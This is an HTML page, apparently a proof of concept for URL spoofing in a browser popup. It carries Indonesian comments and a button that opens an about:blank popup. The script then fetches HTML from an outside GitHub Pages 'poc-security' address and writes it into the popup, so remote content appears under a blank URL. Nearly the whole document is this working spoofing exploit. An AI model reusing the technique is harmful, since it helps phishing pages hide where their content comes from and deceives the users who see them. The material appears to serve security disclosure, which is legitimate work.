<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Popup Demo - Spoofed URL</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            transition: background 0.2s;
        }
        button:hover {
            background-color: #0d5bbf;
        }
    </style>
</head>
<body>
    <button id="openPopupBtn">Open Popup</button>

    <script>
        // Daftar URL yang akan dimuat di popup
        const targetUrl = 'https://nuribnuu.github.io/poc-security/filepicker-spoofing1/';
        
        document.getElementById('openPopupBtn').addEventListener('click', function() {
            // Buka popup dengan URL about:blank
            const popup = window.open('about:blank', '_blank', 'width=400,height=400,scrollbars=yes,resizable=yes');
            
            if (!popup) {
                alert("Popup blocked! Please allow popups.");
                return;
            }
            
            // Ambil konten dari target URL menggunakan fetch
            fetch(targetUrl)
                .then(response => response.text())
                .then(html => {
                    // Tulis konten yang diambil ke dalam popup
                    popup.document.write(html);
                    popup.document.close(); // Penting untuk memastikan dokumen selesai dimuat
                })
                .catch(error => {
                    console.error('Gagal mengambil konten:', error);
                    popup.document.write('<h1>Error loading content</h1>');
                    popup.document.close();
                });
        });
    </script>
</body>
</html>
